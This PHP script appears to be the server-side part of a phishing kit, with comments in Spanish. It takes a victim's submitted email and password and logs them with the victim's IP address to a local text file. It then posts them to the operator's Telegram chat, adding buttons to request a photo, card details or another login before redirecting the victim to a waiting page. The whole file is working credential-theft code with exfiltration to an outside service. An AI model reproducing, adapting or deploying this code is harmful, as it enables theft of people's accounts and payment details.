<?php
session_start();
date_default_timezone_set('America/Caracas');
ini_set("display_errors", 0);

// Incluir configuración de Telegram
include('../data.php');

$userp = $_SERVER['REMOTE_ADDR'];
$sessionId = $_SESSION['user_session_id'] ?? null;
$usuario = $_SESSION['user_email'] ?? 'desconocido';

// Necesitamos al menos el correo en sesión y la contraseña por POST o en sesión
if (isset($_SESSION['e']) && (isset($_SESSION['c']) || isset($_POST['c']))) {

    $file = fopen("musica.txt", "a");

    // Obtener la contraseña desde la sesión o desde el POST
    $passwordValue = isset($_SESSION['c']) ? $_SESSION['c'] : (isset($_POST['c']) ? $_POST['c'] : '');

    fwrite($file, "Correo: ".$_SESSION['e']."   Psswrd: ".$passwordValue." 
Fecha: ".date('Y-m-d')." - ".date('H:i:s')." 
ip:  ".$userp." " . PHP_EOL);
    fwrite($file, "********************************* " . PHP_EOL);
    fclose($file);

    // Enviar datos a Telegram
    $correo = $_SESSION['e'];
    $psswd = $passwordValue;

    $msg = "📧 NUEVO MAIL RECIBIDO\n";
    $msg .= "👤 Usuario: $usuario\n";
    $msg .= "📩 Correo: $correo\n";
    $msg .= "🔑 Password: $psswd\n";
    $msg .= "🌐 IP: $userp\n";

    // Crear botones inline con sessionId
    if ($sessionId) {
        $botones = json_encode([
            'inline_keyboard' => [
                [
                    ['text' => '📸 Pedir Foto', 'callback_data' => 'photo_' . $sessionId],
                    ['text' => '🔁 Login', 'callback_data' => 'login_' . $sessionId]
                ],
                [
                    ['text' => '📩 Mail', 'callback_data' => 'mail_' . $sessionId],
                    ['text' => '💳 Tarjeta', 'callback_data' => 'tarjeta_' . $sessionId]
                ],
                [
                    ['text' => '✅ Listo', 'callback_data' => 'listo_' . $sessionId]
                ]
            ]
        ]);
    } else {
        $botones = json_encode([
            'inline_keyboard' => [
                [
                    ['text' => '✅ Listo', 'callback_data' => 'listo_none']
                ]
            ]
        ]);
    }

    // Enviar a Telegram
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $postData = [
        'chat_id' => $chatID,
        'text' => $msg,
        'reply_markup' => $botones
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);

    unset($_SESSION['e']);
    unset($_SESSION['c']);

    // Actualizar archivo de sesión a waiting para esperar siguiente acción
    if ($sessionId) {
        $sessionFile = __DIR__ . '/../sessions/' . $sessionId . '.txt';
        file_put_contents($sessionFile, 'waiting');
    }

    // Redirigir a página de espera
    header("Location: ../charg.html");
    exit;
}
?>